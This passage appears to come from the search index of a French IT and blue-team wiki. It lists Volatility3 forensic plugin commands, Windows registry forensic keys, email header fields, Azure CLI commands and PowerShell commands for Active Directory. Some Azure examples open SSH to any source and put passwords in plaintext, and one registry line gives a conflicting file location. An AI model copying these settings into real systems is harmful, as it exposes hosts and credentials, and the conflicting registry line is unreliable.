python vol.py -f &lt;image&gt; windows.pslist.PsList --pid &lt;PID&gt; --dump --output-dir &lt;dossier_sortie&gt;\n\n# Extraire le contenu du presse-papiers (Clipboard)\npython vol.py -f &lt;image&gt; windows.clipboard.Clipboard\n\n# Extraire l'historique des commandes (consoles cmd.exe)\npython vol.py -f &lt;image&gt; windows.cmdscan.CmdScan\n\n# Extraire les MFT (Master File Table) pour analyse de syst\u00e8me de fichiers\npython vol.py -f &lt;image&gt; windows.mftscan.MFTScan [--dump-dir &lt;dossier_sortie&gt;]\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#plugins-linux-linux","title":"\ud83d\udc27 Plugins Linux (<code>linux.*</code>)","text":"<p>(Moins nombreux que pour Windows mais utiles)</p> <pre><code># Lister les processus\npython vol.py -f &lt;image&gt; linux.pslist.PsList\npython vol.py -f &lt;image&gt; linux.pstree.PsTree\n\n# Scanner les processus (plus profond)\npython vol.py -f &lt;image&gt; linux.psscan.PsScan\n\n# Afficher l'historique Bash en m\u00e9moire\npython vol.py -f &lt;image&gt; linux.bash.Bash\n\n# Lister les connexions r\u00e9seau\npython vol.py -f &lt;image&gt; linux.netscan.NetScan\n\n# Lister les modules noyau charg\u00e9s\npython vol.py -f &lt;image&gt; linux.lsmod.Lsmod\n\n# V\u00e9rifier les appels syst\u00e8me (syscall table)\npython vol.py -f &lt;image&gt; linux.check_syscall.Check_syscall\n\n# V\u00e9rifier la table d'interruption (IDT)\npython vol.py -f &lt;image&gt; linux.check_idt.Check_idt\n\n# Afficher les points de montage\npython vol.py -f &lt;image&gt; linux.mounts.Mounts\n\n# Extraire des ELFs de la m\u00e9moire\npython vol.py -f &lt;image&gt; linux.elfs.Elfs --dump-dir &lt;dossier_sortie&gt;\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/CheatSheets/Volatility3/#plugins-macos-mac","title":"\ud83c\udf4e Plugins macOS (<code>mac.*</code>)","text":"<p>(Encore moins nombreux, mais la base est l\u00e0)</p> <pre><code># Lister les processus\npython vol.py -f &lt;image&gt; mac.pslist.PsList\npython vol.py -f &lt;image&gt; mac.pstree.PsTree\n\n# Afficher l'historique Bash en m\u00e9moire\npython vol.py -f &lt;image&gt; mac.bash.Bash\n\n# Lister les connexions r\u00e9seau\npython vol.py -f &lt;image&gt; mac.netstat.NetStat\n\n# Lister les fichiers ouverts (similaire \u00e0 lsof)\npython vol.py -f &lt;image&gt; mac.lsof.Lsof\n\n# V\u00e9rifier les appels syst\u00e8me (syscall table)\npython vol.py -f &lt;image&gt; mac.check_syscall.Check_syscall\n\n# Afficher les points de montage\npython vol.py -f &lt;image&gt; mac.mount.Mounts\n\n# Lister les extensions noyau charg\u00e9es (kexts)\npython vol.py -f &lt;image&gt; mac.lsmod.Lsmod\n</code></pre>"},{"location":"Blue%20Team/Forensic/Registres/Clefs%20de%20registres/","title":"Clefs de registres","text":"<ul> <li>Version de l'OS: <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion</code></li> <li>Control Set: <code>SYSTEM\\ControlSet001</code> (ControlSet avec lequel la machine est d\u00e9marr\u00e9e) - <code>SYSTEM\\ControlSet002</code> (\"last known good\" ControlSet) - <code>HKLM\\SYSTEM\\CurrentControlSet</code> (ControlSet \"volatile\" cr\u00e9e quand la machine est en cours d'utilisation)</li> <li>Nom de la machine: <code>SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName</code></li> <li>TimeZone: <code>SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation</code></li> <li>Configuration r\u00e9seau: <code>SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces</code></li> <li>Autoruns: <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> - <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> - <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run</code> - <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code></li> <li>Services: <code>SYSTEM\\CurrentControlSet\\Services</code></li> <li>Informations sur les utilisateurs: <code>SAM\\Domains\\Account\\Users</code></li> <li>Documents r\u00e9cents: <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs</code></li> <li>Documents r\u00e9cents li\u00e9s \u00e0 Office: <code>NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Office\\15.0\\Word</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION\\UserMRU\\LiveID_####\\FileMRU</code></li> <li>Recherches effectu\u00e9es dans l'explorer/path acc\u00e9d\u00e9 dans l'explorer: <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery</code></li> <li></li> </ul>"},{"location":"Blue%20Team/Forensic/Registres/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"Folder/predefined key Description HKEY_CURRENT_USER Contient la racine des informations de configuration pour l'utilisateur actuellement connect\u00e9. Les dossiers de l'utilisateur, les couleurs d'\u00e9cran et les param\u00e8tres du panneau de configuration sont stock\u00e9s ici. Ces informations sont associ\u00e9es au profil de l'utilisateur. Cette cl\u00e9 est parfois abr\u00e9g\u00e9e en HKCU. HKEY_USERS Contient tous les profils utilisateur activement charg\u00e9s sur l'ordinateur. HKEY_CURRENT_USER est une sous-cl\u00e9 de HKEY_USERS. HKEY_USERS est parfois abr\u00e9g\u00e9e en HKU. HKEY_LOCAL_MACHINE Contient des informations de configuration particuli\u00e8res \u00e0 l'ordinateur (pour tout utilisateur). Cette cl\u00e9 est parfois abr\u00e9g\u00e9e en HKLM. HKEY_CLASSES_ROOT Est une sous-cl\u00e9 de <code>HKEY_LOCAL_MACHINE\\Software</code>. Les informations stock\u00e9es ici assurent que le programme correct s'ouvre lorsque vous ouvrez un fichier en utilisant l'Explorateur Windows. Cette cl\u00e9 est parfois abr\u00e9g\u00e9e en HKCR.\u00c0 partir de Windows 2000, ces informations sont stock\u00e9es sous les cl\u00e9s HKEY_LOCAL_MACHINE et HKEY_CURRENT_USER. La cl\u00e9 <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code> contient les param\u00e8tres par d\u00e9faut qui peuvent s'appliquer \u00e0 tous les utilisateurs de l'ordinateur local. La cl\u00e9 <code>HKEY_CURRENT_USER\\Software\\Classes</code> contient des param\u00e8tres qui remplacent les param\u00e8tres par d\u00e9faut et s'appliquent uniquement \u00e0 l'utilisateur interactif.La cl\u00e9 HKEY_CLASSES_ROOT fournit une vue du registre qui fusionne les informations provenant de ces deux sources. HKEY_CLASSES_ROOT fournit \u00e9galement cette vue fusionn\u00e9e pour les programmes con\u00e7us pour les versions ant\u00e9rieures de Windows. Pour modifier les param\u00e8tres de l'utilisateur interactif, les changements doivent \u00eatre effectu\u00e9s sous <code>HKEY_CURRENT_USER\\Software\\Classes</code> au lieu de HKEY_CLASSES_ROOT.Pour modifier les param\u00e8tres par d\u00e9faut, les changements doivent \u00eatre effectu\u00e9s sous <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code>. Si vous \u00e9crivez des cl\u00e9s dans une cl\u00e9 sous HKEY_CLASSES_ROOT, le syst\u00e8me stocke les informations sous <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code>.Si vous \u00e9crivez des valeurs dans une cl\u00e9 sous HKEY_CLASSES_ROOT, et que la cl\u00e9 existe d\u00e9j\u00e0 sous <code>HKEY_CURRENT_USER\\Software\\Classes</code>, le syst\u00e8me stockera les informations l\u00e0 au lieu de sous <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code>. HKEY_CURRENT_CONFIG Contient des informations sur le profil mat\u00e9riel utilis\u00e9 par l'ordinateur local au d\u00e9marrage du syst\u00e8me. <ul> <li> <p>Sur le disque, le registre est stock\u00e9 dans <code>C:\\Windows\\System32\\Config</code></p> </li> <li> <p>Aussi, dans les dossier <code>C:\\Users\\$Username\\</code>  se trouvent les fichiers NTUSER.DAT qui correspond \u00e0 la clef <code>HKEY_CURRENT_USER</code> et le fichier USERCLASS.DAT qui correspond \u00e0 la clef <code>HKEY_CURRENT_USER\\Software\\CLASSES</code></p> </li> <li> <p>Le contenu de NTUSER.DAT se trouve dans <code>C:\\Users\\$Username\\AppData\\Local\\Microsoft\\Windows</code>.</p> </li> <li> <p>Le contenu de NTUSER.DAT se trouve dans <code>C:\\Users\\$Username\\</code>.</p> </li> <li> <p>Tout les 10 jours, une sauvegarde des diff\u00e9rents registres est faites, celle-ci peut se retrouver dans le dossier <code>C:\\Windows\\System32\\config\\RegBack</code>.</p> </li> <li>Les clefs Amcache se trouvent dans <code>C:\\Windows\\AppCompat\\Programs\\Amcache.hve</code></li> </ul>"},{"location":"Blue%20Team/Forensic/Registres/Tools/","title":"Tools","text":"<p>Zimmerman's Registry Explorer : https://ericzimmerman.github.io/#!index.md</p> <p>Autopsy : https://www.autopsy.com/</p> <p>FTK Imager : https://www.exterro.com/digital-forensics-software/ftk-imager</p>"},{"location":"Blue%20Team/Mails/Analyse%20de%20base/","title":"Analyse de base","text":"<p>Champs Header: <pre><code>- From, showing the sender's email address\n- To, showing the recipient's email address\n- Date, showing the date when the email was sent.\n</code></pre></p> <p>Champs optionnels: <pre><code>- Received, showing various information about the intermediary servers and the date when the message was processed\n- Reply-To, showing a reply address\n- subject, showing the message's subject\n- message-ID, showing a unique identification for the message\n- message body, containing the message, separated from the header by a line break\n</code></pre></p> <p>Artefacts: <pre><code>- Sending Address\n- Subject Line\n- Recipient(s)\n- Date and Time\n- Sending Server IP\n- Reverse DNS of Sending Server IP\n- Reply-To (if present)\n</code></pre></p>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/","title":"AZ Cli","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#pre-requis","title":"\ud83d\ude80 Pr\u00e9-requis","text":"<ul> <li>Installer Azure CLI\u00a0:\u00a0Documentation\u00a0officielle</li> </ul>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#se-connecter-a-azure","title":"Se connecter \u00e0 Azure","text":"<pre><code>az login\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#changer-dabonnement","title":"Changer d\u2019abonnement","text":"<pre><code>az account set --subscription \"Nom_de_l'abonnement\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#afficher-labonnement-courant","title":"Afficher l\u2019abonnement courant","text":"<pre><code>az account show\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-groupes-de-ressources","title":"\ud83e\udd5e Gestion des Groupes de Ressources","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-les-groupes-de-ressources","title":"Lister les groupes de ressources","text":"<pre><code>az group list --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-groupe-de-ressources","title":"Cr\u00e9er un groupe de ressources","text":"<pre><code>az group create --name MyResourceGroup --location eastus\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#supprimer-un-groupe-de-ressources","title":"Supprimer un groupe de ressources","text":"<pre><code>az group delete --name MyResourceGroup --yes\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#afficher-les-details-dun-groupe-de-ressources","title":"Afficher les d\u00e9tails d\u2019un groupe de ressources","text":"<pre><code>az group show --name MyResourceGroup\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-machines-virtuelles-vm","title":"\ud83d\udcbb Gestion des Machines Virtuelles (VM)","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-une-vm","title":"Cr\u00e9er une VM","text":"<pre><code>az vm create --resource-group MyResourceGroup --name MyVM --image UbuntuLTS --admin-username azureuser --generate-ssh-keys\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#demarrer-une-vm","title":"D\u00e9marrer une VM","text":"<pre><code>az vm start --resource-group MyResourceGroup --name MyVM\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#arreter-une-vm","title":"Arr\u00eater une VM","text":"<pre><code>az vm stop --resource-group MyResourceGroup --name MyVM\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#redemarrer-une-vm","title":"Red\u00e9marrer une VM","text":"<pre><code>az vm restart --resource-group MyResourceGroup --name MyVM\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#supprimer-une-vm","title":"Supprimer une VM","text":"<pre><code>az vm delete --resource-group MyResourceGroup --name MyVM --yes\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-toutes-les-vm-dans-un-groupe-de-ressources","title":"Lister toutes les VM dans un groupe de ressources","text":"<pre><code>az vm list --resource-group MyResourceGroup --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#afficher-les-informations-detaillees-dune-vm","title":"Afficher les informations d\u00e9taill\u00e9es d\u2019une VM","text":"<pre><code>az vm show --resource-group MyResourceGroup --name MyVM --show-details\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#obtenir-ladresse-ip-publique-dune-vm","title":"Obtenir l'adresse IP publique d\u2019une VM","text":"<pre><code>az vm list-ip-addresses --resource-group MyResourceGroup --name MyVM --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-disques","title":"\ud83d\udcbe Gestion des Disques","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-les-disques-dun-groupe-de-ressources","title":"Lister les disques d\u2019un groupe de ressources","text":"<pre><code>az disk list --resource-group MyResourceGroup --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-disque-manage","title":"Cr\u00e9er un disque manag\u00e9","text":"<pre><code>az disk create --resource-group MyResourceGroup --name MyDisk --size-gb 128\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#supprimer-un-disque","title":"Supprimer un disque","text":"<pre><code>az disk delete --resource-group MyResourceGroup --name MyDisk --yes\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-comptes-de-stockage","title":"\ud83d\uddc3\ufe0f Gestion des Comptes de Stockage","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-les-comptes-de-stockage","title":"Lister les comptes de stockage","text":"<pre><code>az storage account list --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-compte-de-stockage","title":"Cr\u00e9er un compte de stockage","text":"<pre><code>az storage account create --name mystorageaccount --resource-group MyResourceGroup --location eastus --sku Standard_LRS\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#obtenir-les-cles-dacces-dun-compte-de-stockage","title":"Obtenir les cl\u00e9s d\u2019acc\u00e8s d\u2019un compte de stockage","text":"<pre><code>az storage account keys list --resource-group MyResourceGroup --account-name mystorageaccount --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#supprimer-un-compte-de-stockage","title":"Supprimer un compte de stockage","text":"<pre><code>az storage account delete --name mystorageaccount --resource-group MyResourceGroup --yes\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-reseaux","title":"\ud83c\udf10 Gestion des R\u00e9seaux","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-virtual-network-vnet","title":"Cr\u00e9er un Virtual Network (VNet)","text":"<pre><code>az network vnet create --name MyVNet --resource-group MyResourceGroup --subnet-name MySubnet\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#ajouter-un-sous-reseau","title":"Ajouter un sous-r\u00e9seau","text":"<pre><code>az network vnet subnet create --resource-group MyResourceGroup --vnet-name MyVNet --name MyNewSubnet --address-prefix 10.0.1.0/24\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-une-adresse-ip-publique","title":"Cr\u00e9er une adresse IP publique","text":"<pre><code>az network public-ip create --resource-group MyResourceGroup --name MyPublicIP\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-network-security-group-nsg","title":"Cr\u00e9er un Network Security Group (NSG)","text":"<pre><code>az network nsg create --resource-group MyResourceGroup --name MyNSG\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#ajouter-une-regle-au-nsg","title":"Ajouter une r\u00e8gle au NSG","text":"<pre><code>az network nsg rule create --resource-group MyResourceGroup --nsg-name MyNSG --name AllowSSH --protocol Tcp --direction Inbound --priority 1000 --source-address-prefix '*' --source-port-range '*' --destination-address-prefix '*' --destination-port-range 22 --access Allow\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-bases-de-donnees-sql","title":"\ud83d\uddc4\ufe0f Gestion des Bases de Donn\u00e9es (SQL)","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-serveur-sql","title":"Cr\u00e9er un serveur SQL","text":"<pre><code>az sql server create --name myserver --resource-group MyResourceGroup --location eastus --admin-user myadmin --admin-password SecurePassword123!\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-une-base-de-donnees-sql","title":"Cr\u00e9er une base de donn\u00e9es SQL","text":"<pre><code>az sql db create --resource-group MyResourceGroup --server myserver --name mydatabase --service-objective S0\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-les-bases-de-donnees-sql-dun-serveur","title":"Lister les bases de donn\u00e9es SQL d\u2019un serveur","text":"<pre><code>az sql db list --resource-group MyResourceGroup --server myserver --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#supprimer-une-base-de-donnees-sql","title":"Supprimer une base de donn\u00e9es SQL","text":"<pre><code>az sql db delete --resource-group MyResourceGroup --server myserver --name mydatabase --yes\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-utilisateurs-azure-ad","title":"\ud83e\udd3c Gestion des Utilisateurs Azure AD","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-tous-les-utilisateurs","title":"Lister tous les utilisateurs","text":"<pre><code>az ad user list --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-nouvel-utilisateur","title":"Cr\u00e9er un nouvel utilisateur","text":"<pre><code>az ad user create --display-name \"John Doe\" --user-principal-name jdoe@domain.onmicrosoft.com --password \"SecurePassword123!\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#supprimer-un-utilisateur","title":"Supprimer un utilisateur","text":"<pre><code>az ad user delete --id jdoe@domain.onmicrosoft.com\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-regles-dalertes","title":"\u26a0\ufe0f Gestion des R\u00e8gles d\u2019Alertes","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-une-regle-dalerte-sur-une-vm-cpu-80","title":"Cr\u00e9er une r\u00e8gle d\u2019alerte sur une VM (CPU &gt; 80%)","text":"<pre><code>az monitor metrics alert create --name \"HighCPUAlert\" --resource-group MyResourceGroup --scopes \"/subscriptions/&lt;subscription-id&gt;/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM\" --condition \"avg Percentage CPU &gt; 80\" --description \"Alerte lorsque le CPU d\u00e9passe 80%\" --action-group \"MyActionGroup\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#lister-les-alertes","title":"Lister les alertes","text":"<pre><code>az monitor alert list --output table\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#gestion-des-sauvegardes","title":"\ud83d\udcbe Gestion des Sauvegardes","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#creer-un-recovery-vault","title":"Cr\u00e9er un Recovery Vault","text":"<pre><code>az backup vault create --resource-group MyResourceGroup --name MyRecoveryVault --location eastus\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#configurer-la-protection-dune-vm","title":"Configurer la protection d\u2019une VM","text":"<pre><code>az backup protection enable-for-vm --resource-group MyResourceGroup --vault-name MyRecoveryVault --vm MyVM --policy-name DefaultPolicy\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/AZ-Cli/#demarrer-une-sauvegarde-manuelle","title":"D\u00e9marrer une sauvegarde manuelle","text":"<pre><code>az backup protection backup-now --resource-group MyResourceGroup --vault-name MyRecoveryVault --container-name MyContainer --item-name MyVM --retain-until 30-12-2024\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/","title":"Administration Active Direcotry","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#pre-requis","title":"\ud83d\ude80 Pr\u00e9-requis","text":"<pre><code>Import-Module ActiveDirectory\n</code></pre> <p>Remarque\u00a0: Si le module n\u2019est pas disponible, il est n\u00e9cessaire d\u2019installer le\u00a0RSAT (Remote Server Administration Tools).</p>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-utilisateurs","title":"\ud83e\udd3c Gestion des Utilisateurs","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#creer-un-nouvel-utilisateur","title":"Cr\u00e9er un nouvel utilisateur","text":"<pre><code>New-ADUser -Name \"John Doe\" -SamAccountName jdoe -UserPrincipalName jdoe@domain.local -Path \"OU=Users,DC=domain,DC=local\" -AccountPassword (ConvertTo-SecureString \"Password123!\" -AsPlainText -Force) -Enabled $true\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#modifier-les-proprietes-dun-utilisateur-existant","title":"Modifier les propri\u00e9t\u00e9s d\u2019un utilisateur existant","text":"<pre><code>Set-ADUser -Identity jdoe -Title \"IT Manager\" -Department \"IT\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#desactiveractiver-un-utilisateur","title":"D\u00e9sactiver/Activer un utilisateur","text":"<pre><code>Disable-ADAccount -Identity jdoe Enable-ADAccount -Identity jdoe\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#deplacer-un-utilisateur-vers-une-autre-ou","title":"D\u00e9placer un utilisateur vers une autre OU","text":"<pre><code>Move-ADObject -Identity \"CN=John Doe,OU=Users,DC=domain,DC=local\" -TargetPath \"OU=IT,DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#reinitialiser-le-mot-de-passe-dun-utilisateur","title":"R\u00e9initialiser le mot de passe d\u2019un utilisateur","text":"<pre><code>Set-ADAccountPassword -Identity jdoe -Reset -NewPassword (ConvertTo-SecureString \"NewPassword123!\" -AsPlainText -Force)\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#lister-tous-les-utilisateurs-dune-ou-specifique","title":"Lister tous les utilisateurs d'une OU sp\u00e9cifique","text":"<pre><code>Get-ADUser -Filter * -SearchBase \"OU=IT,DC=domain,DC=local\" -Property DisplayName, Title, Department\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-groupes","title":"\ud83d\udc68\u200d\ud83d\udc68\u200d\ud83d\udc66 Gestion des Groupes","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#creer-un-groupe","title":"Cr\u00e9er un groupe","text":"<pre><code>New-ADGroup -Name \"IT Admins\" -SamAccountName \"ITAdmins\" -GroupCategory Security -GroupScope Global -Path \"OU=Groups,DC=domain,DC=local\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#ajouter-un-utilisateur-a-un-groupe","title":"Ajouter un utilisateur \u00e0 un groupe","text":"<pre><code>Add-ADGroupMember -Identity \"IT Admins\" -Members jdoe\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#supprimer-un-utilisateur-dun-groupe","title":"Supprimer un utilisateur d\u2019un groupe","text":"<pre><code>Remove-ADGroupMember -Identity \"IT Admins\" -Members jdoe -Confirm:$false\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#lister-les-membres-dun-groupe","title":"Lister les membres d\u2019un groupe","text":"<pre><code>Get-ADGroupMember -Identity \"IT Admins\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#rechercher-les-groupes-dun-utilisateur","title":"Rechercher les groupes d\u2019un utilisateur","text":"<pre><code>Get-ADUser -Identity jdoe -Property MemberOf | Select-Object -ExpandProperty MemberOf\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-ordinateurs","title":"\ud83d\udcbb Gestion des Ordinateurs","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#lister-tous-les-ordinateurs","title":"Lister tous les ordinateurs","text":"<pre><code>Get-ADComputer -Filter * -Property Name, OperatingSystem | Select-Object Name, OperatingSystem\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#renommer-un-ordinateur-dans-active-directory","title":"Renommer un ordinateur dans Active Directory","text":"<pre><code>Rename-ADObject -Identity \"CN=OldName,OU=Computers,DC=domain,DC=local\" -NewName \"NewName\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#ajouter-un-ordinateur-a-un-groupe","title":"Ajouter un ordinateur \u00e0 un groupe","text":"<pre><code>Add-ADGroupMember -Identity \"Server Admins\" -Members \"NewName$\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#desactiveractiver-un-ordinateur","title":"D\u00e9sactiver/Activer un ordinateur","text":"<pre><code>Disable-ADAccount -Identity \"Computer1$\" Enable-ADAccount -Identity \"Computer1$\"\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#recherches-filtres-dans-active-directory","title":"\ud83d\udd0e Recherches &amp; Filtres dans Active Directory","text":""},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#rechercher-les-utilisateurs-inactifs-depuis-90-jours","title":"Rechercher les utilisateurs inactifs depuis 90 jours","text":"<pre><code>Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)} -Property LastLogonDate | Select-Object Name, LastLogonDate\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#rechercher-les-comptes-desactives","title":"Rechercher les comptes d\u00e9sactiv\u00e9s","text":"<pre><code>Get-ADUser -Filter {Enabled -eq $false} -Property DisplayName\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#rechercher-les-comptes-proteges-protected-users","title":"Rechercher les comptes prot\u00e9g\u00e9s (Protected Users)","text":"<pre><code>Get-ADUser -Filter 'PrimaryGroupID -eq 521' -Property DisplayName\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#rechercher-les-ordinateurs-windows-10-uniquement","title":"Rechercher les ordinateurs Windows 10 uniquement","text":"<pre><code>Get-ADComputer -Filter {OperatingSystem -like '*Windows 10*'} -Property Name, OperatingSystem\n</code></pre>"},{"location":"IT/Azure%20et%20Active%20Directory/Cheatsheet/Administration%20Active%20Direcotry/#gestion-des-organizational-units-ou","title":"\ud83e\udd35 Gestion des Organizational Units 